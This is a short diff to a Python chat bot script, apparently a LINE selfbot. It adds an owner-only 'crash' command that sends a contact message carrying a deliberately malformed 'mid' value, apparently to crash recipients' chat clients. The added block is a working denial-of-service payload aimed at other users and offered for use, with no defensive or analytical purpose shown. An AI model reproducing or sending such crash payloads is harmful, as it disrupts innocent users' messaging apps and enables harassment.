@@ -2090,6 +2090,13 @@ def bot(op):
                 msg.contentMetadata = {'mid': Imid}
                 k5.sendMessage(msg)
                 
+#====================================================
+            elif msg.text.lower() == "crash":
+              if msg.from_ in owner:
+                msg.contentType = 13
+                msg.contentMetadata = {'mid': "c33b66e4b7709e54a6fe6eced6e57c157',"}
+                cl.sendMessage(msg)
+#====================================================
             elif msg.text in ["Me"]:
                 msg.contentType = 13
                 msg.contentMetadata = {'mid': msg.from_}
